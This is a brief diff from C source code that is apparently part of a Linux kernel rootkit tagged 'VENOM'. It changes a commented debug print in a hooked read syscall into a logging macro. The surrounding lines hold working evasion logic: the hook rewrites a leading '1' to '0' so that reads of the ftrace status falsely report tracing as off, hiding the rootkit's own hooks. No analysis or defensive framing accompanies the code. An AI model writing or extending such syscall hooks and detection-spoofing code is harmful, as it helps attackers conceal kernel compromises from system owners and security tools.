@@ -60,7 +60,7 @@ notrace static asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
                 if (spoof_next_read == 0 && bytes_read > 0 && kernel_buf[0] == '1') {
                     kernel_buf[0] = '0';
                     spoof_next_read = 1;
-                    // printk(KERN_DEBUG "[VENOM] Spoofed ftrace status read\n");
+                    TLOG_INF("[VENOM] Spoofed ftrace status read\n");
                 } else {
                     spoof_next_read = 0;
                 }
@@ -81,4 +81,3 @@ notrace static asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
 }
 
 #endif 
-
